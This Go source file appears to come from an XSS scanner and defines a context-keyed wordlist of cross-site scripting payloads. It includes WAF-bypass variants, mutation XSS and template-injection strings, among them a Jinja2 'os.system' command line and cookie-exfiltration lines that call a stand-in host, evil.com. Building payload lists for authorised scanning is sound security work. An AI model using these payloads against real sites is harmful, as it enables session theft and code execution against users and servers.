package payload

import (
	"github.com/xsscan/xsscan/pkg/context"
	"github.com/xsscan/xsscan/pkg/model"
)

// extendedPayloads are additional payloads imported from community wordlists
// (dalfox, PortSwigger XSS cheat sheet, OWASP) and reclassified for xsscan's
// 19 injection contexts. Merged into the core wordlist at scan time via
// mergePayloadMaps in generator.go.
var extendedPayloads = map[context.ContextType][]PayloadTemplate{
	context.ContextHTMLBody: {
		// Additional event handlers (mobile, pointer, transition)
		{Value: `<body onbeforeinput=alert(1)>`, Severity: model.High, Desc: "Body onbeforeinput"},
		{Value: `<body onhashchange=alert(1)>`, Severity: model.Medium, Desc: "Body onhashchange"},
		{Value: `<body onmessage=alert(1)>`, Severity: model.Medium, Desc: "Body onmessage (postMessage XSS)"},
		{Value: `<body onpointerenter=alert(1)>`, Severity: model.High, Desc: "Body onpointerenter"},
		{Value: `<body onpointermove=alert(1)>`, Severity: model.Medium, Desc: "Body onpointermove"},
		{Value: `<body ontransitionend=alert(1) style=transition:1s>`, Severity: model.Medium, Desc: "Body ontransitionend"},
		{Value: `<body onanimationstart=alert(1) style=animation:1s>`, Severity: model.Medium, Desc: "Body onanimationstart"},

		// Additional non-event payloads (no on* handler required)
		{Value: `<svg><script>alert(1)</script>`, Severity: model.High, Desc: "SVG script tag (no event handler)"},
		{Value: `<math><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></math>`, Severity: model.High, Desc: "MathML annotation-xml script"},
		{Value: `<xmp><script>alert(1)</script></xmp>`, Severity: model.High, Desc: "XMP script execution"},

		// CSS-based execution vectors (no on* handler)
		{Value: `<style>@keyframes x{}</style><div style="animation-name:x" onanimationend=alert(1)>`, Severity: model.High, Desc: "CSS animation event trigger"},

		// Additional WAF bypass variants
		{Value: `<IMG SRC=x ONERROR=alert(1)>`, Severity: model.High, Desc: "Uppercase tag+attr WAF bypass", WAFBypassOnly: true},
		{Value: `<ImG sRc=x oNeRrOr=alert(1)>`, Severity: model.High, Desc: "Mixed case WAF bypass", WAFBypassOnly: true},
		{Value: `<img/src="x"/onerror=alert(1)>`, Severity: model.High, Desc: "Slash-quote WAF bypass", WAFBypassOnly: true},
		{Value: `<img src=x onerror=alert(1) `, Severity: model.High, Desc: "URL-encodable onerror"},
		{Value: `<img src=x onerror=&#97;lert(1)>`, Severity: model.High, Desc: "HTML entity in handler (semi-encoded)", WAFBypassOnly: true},

		// Short payloads for length-constrained inputs
		{Value: `<q/oncut=alert(1)>`, Severity: model.High, Desc: "Short HTML5 oncut (15 chars)"},
		{Value: `<b/onmouseover=alert(1)>`, Severity: model.Medium, Desc: "Short onmouseover"},
		{Value: `<keygen autofocus onfocus=alert(1)>`, Severity: model.High, Desc: "Deprecated keygen autofocus"},
		{Value: `<isindex action=javascript:alert(1) type=image>`, Severity: model.Medium, Desc: "Isindex javascript action"},
		{Value: `<isindex type=image src=1 onerror=alert(1)>`, Severity: model.High, Desc: "Isindex onerror"},

		// Portal / popover (newer HTML features)
		{Value: `<portal src=javascript:alert(1)>`, Severity: model.Medium, Desc: "Portal javascript src"},
		{Value: `<div popover id=x>XSS</div><button popovertarget=x>`, Severity: model.Medium, Desc: "Popover API (Chrome)"},

		// Additional DOM clobbering vectors
		{Value: `<img name=currentScript onerror=alert(1)>`, Severity: model.High, Desc: "DOM clobber currentScript"},
		{Value: `<a name=notifications id=notifications>`, Severity: model.Medium, Desc: "DOM clobber notifications API"},

		// Additional mutation XSS
		{Value: `<table><math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`, Severity: model.High, Desc: "mXSS table-math nesting"},
		{Value: `<svg><desc><style><img src=x onerror=alert(1)>`, Severity: model.High, Desc: "mXSS svg-desc breakout"},
		{Value: `<svg><metadata><style><img src=x onerror=alert(1)>`, Severity: model.High, Desc: "mXSS svg-metadata breakout"},
	},

	context.ContextHTMLAttrValue: {
		// Quote-less breakout (space-separated)
		{Value: ` autofocus onfocus=alert(1) x=`, Severity: model.High, Desc: "Space breakout (no quotes)"},
		{Value: `%20autofocus%20onfocus=alert(1)%20`, Severity: model.High, Desc: "URL-encoded space breakout"},

		// Backtick breakout
		{Value: "` autofocus onfocus=alert(1) `", Severity: model.High, Desc: "Backtick breakout"},

		// Additional event handlers for attr contexts
		{Value: `" onpointerenter=alert(1) x="`, Severity: model.High, Desc: "Quote breakout + onpointerenter"},
		{Value: `" oncut=alert(1) x="`, Severity: model.High, Desc: "Quote breakout + oncut"},
		{Value: `" oncopy=alert(1) x="`, Severity: model.Medium, Desc: "Quote breakout + oncopy"},
		{Value: `" onpaste=alert(1) x="`, Severity: model.Medium, Desc: "Quote breakout + onpaste"},
		{Value: `" onanimationend=alert(1) x="`, Severity: model.High, Desc: "Quote breakout + CSS animation event"},

		// WAF bypass variants for attr contexts
		{Value: `" oNfOcUs=al\u0065rt(1) aUtOfOcUs="`, Severity: model.High, Desc: "Mixed case + unicode escape", WAFBypassOnly: true},
	},

	context.ContextJSString: {
		// Additional string breakout patterns
		{Value: `'*alert(1)*'`, Severity: model.High, Desc: "Quote breakout with asterisk padding"},
		{Value: `'%0aalert(1)%0a'`, Severity: model.High, Desc: "Newline-encoded breakout"},
		{Value: `\'-alert(1)//`, Severity: model.High, Desc: "Backslash-escaped quote breakout"},
		{Value: `</script><svg/onload=alert(1)>`, Severity: model.High, Desc: "Script close + SVG onload"},
		{Value: `';eval(atob('YWxlcnQoMSk='))//`, Severity: model.High, Desc: "eval+atob base64 alert"},

		// Unicode/hex escape variants
		{Value: `';eval('\x61lert(1)')//`, Severity: model.High, Desc: "Hex-escaped alert"},
		{Value: `';eval('\u0061lert(1)')//`, Severity: model.High, Desc: "Unicode-escaped alert"},

		// Template literal injection variants
		{Value: `${document.cookie}`, Severity: model.Medium, Desc: "Template literal cookie exfil"},
		{Value: `${fetch('//evil.com?c='+document.cookie)}`, Severity: model.Medium, Desc: "Template literal fetch exfil"},

		// Multi-line comment breakout
		{Value: `*/alert(1)/*`, Severity: model.Medium, Desc: "JS multi-line comment breakout"},
	},

	context.ContextURLAttr: {
		// Additional protocol variants
		{Value: `javascript:fetch('//evil.com?c='+document.cookie)`, Severity: model.Medium, Desc: "JS URI fetch exfil"},
		{Value: `javascript:void(document.body.innerHTML='<img src=x onerror=alert(1)>')`, Severity: model.High, Desc: "JS URI innerHTML injection"},
		{Value: `javascript:eval(atob('YWxlcnQoMSk='))`, Severity: model.High, Desc: "JS URI eval base64"},

		// Encoded javascript: variants
		{Value: `java%0d%0ascript:alert(1)`, Severity: model.High, Desc: "CRLF-encoded javascript URI"},
		{Value: `\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74:alert(1)`, Severity: model.High, Desc: "Hex-encoded javascript URI prefix"},
		{Value: `blob:javascript:alert(1)`, Severity: model.Medium, Desc: "Blob javascript URI chain"},
	},

	context.ContextJSBlock: {
		// Additional direct JS execution variants
		{Value: `(alert)(1)`, Severity: model.Critical, Desc: "Indirect function call"},
		{Value: `window['alert'](1)`, Severity: model.Critical, Desc: "Bracket access alert"},
		{Value: `top['alert'](1)`, Severity: model.Critical, Desc: "top window alert"},
		{Value: `self['alert'](1)`, Severity: model.Critical, Desc: "self window alert"},
		{Value: `[].constructor.constructor('alert(1)')()`, Severity: model.Critical, Desc: "Array constructor chain"},
		{Value: `''.constructor.constructor('alert(1)')()`, Severity: model.Critical, Desc: "String constructor chain"},
	},

	context.ContextHTMLComment: {
		// Additional comment breakout payloads
		{Value: `--!><img src=x onerror=alert(1)>`, Severity: model.High, Desc: "Bang-comment variant breakout"},
		{Value: `--><svg/onload=alert(1)>`, Severity: model.High, Desc: "Comment + SVG onload"},
		{Value: `--><body onload=alert(1)>`, Severity: model.Medium, Desc: "Comment + body onload"},
	},

	context.ContextTemplate: {
		// Additional framework template injection payloads
		{Value: `{{_instance.constructor('alert(1)')()}}`, Severity: model.High, Desc: "Vue instance constructor"},
		{Value: `{{$emit.constructor('alert(1)')()}}`, Severity: model.High, Desc: "Vue emit constructor"},
		{Value: `{$smarty.template_object->smarty->enableSecurity()}`, Severity: model.Medium, Desc: "Smarty template injection"},
		{Value: `{%import os%}{{os.system('id')}}`, Severity: model.Critical, Desc: "Jinja2 import os (SSTI/RCE)"},
	},

	context.ContextJSONValue: {
		// Additional JSON breakout payloads
		{Value: `"}},alert(1),{"x":"`, Severity: model.High, Desc: "JSON double-object breakout"},
		{Value: `"]};alert(1)//`, Severity: model.High, Desc: "JSON array-object breakout"},
	},

	context.ContextCSSValue: {
		// CSS injection variants
		{Value: `url(javascript:alert(1))`, Severity: model.Medium, Desc: "CSS url javascript (older browsers)"},
		{Value: `-moz-binding:url(//evil.com/xss.xml#xss)`, Severity: model.Medium, Desc: "Mozilla XBL binding (Firefox legacy)"},
	},

	context.ContextCSSBlock: {
		{Value: `</style><iframe srcdoc="<script>alert(1)</script>">`, Severity: model.High, Desc: "Style breakout + iframe srcdoc"},
	},
}
